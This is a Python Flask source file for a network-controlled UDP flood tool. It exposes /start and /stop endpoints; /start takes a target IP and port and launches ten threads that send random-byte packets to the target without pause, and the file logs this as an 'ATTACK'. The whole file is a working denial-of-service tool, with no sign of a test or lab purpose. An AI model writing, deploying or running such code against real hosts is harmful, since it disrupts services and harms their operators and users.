from flask import Flask, request
import threading
import os
import socket
import random

app = Flask(__name__)
stop_flag = threading.Event()
current_target = {"ip": None, "port": None}

def flood_udp(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_flag.is_set():
        try:
            data = os.urandom(random.randint(64, 1469))
            sock.sendto(data, (ip, int(port)))
        except Exception:
            break

@app.route('/start', methods=['POST'])
def start_attack():
    data = request.get_json()
    ip = data.get("ip")
    port = int(data.get("port"))
    current_target["ip"] = ip
    current_target["port"] = port

    stop_flag.clear()
    for _ in range(10):
        threading.Thread(target=flood_udp, args=(ip, port), daemon=True).start()

    print(f"🚀 ATTACK STARTED → IP: {ip}, PORT: {port}")
    return {"status": "attacking", "ip": ip, "port": port}

@app.route('/stop', methods=['POST'])
def stop_attack():
    stop_flag.set()
    ip = current_target.get("ip")
    port = current_target.get("port")
    print(f"🛑 ATTACK STOPPED → IP: {ip}, PORT: {port}")
    return {"status": "stopped", "ip": ip, "port": port}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000)
